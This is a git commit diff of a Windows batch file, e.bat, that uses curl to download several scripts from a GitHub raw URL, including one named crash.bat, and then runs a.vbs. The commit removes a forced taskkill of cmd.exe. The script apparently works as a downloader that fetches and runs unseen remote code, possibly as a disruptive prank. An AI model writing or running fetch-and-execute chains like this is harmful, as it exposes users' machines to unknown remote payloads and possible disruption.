a771b91cb9e3a04054117855b95d1fc6140ae03c
p6c <77642915+p6c@users.noreply.github.com>
2021-01-19 17:10:17 +0100

    Update e.bat

--- e.bat
+++ e.bat
@@ -4,4 +4,3 @@ curl --output b.vbs "https://raw.githubusercontent.com/p6c/a/main/b.vbs"
 curl --output c.bat "https://raw.githubusercontent.com/p6c/a/main/c.bat"
 curl --output crash.bat "https://raw.githubusercontent.com/p6c/a/main/crash.bat"
 a.vbs
-taskkill /t /f /im cmd.exe
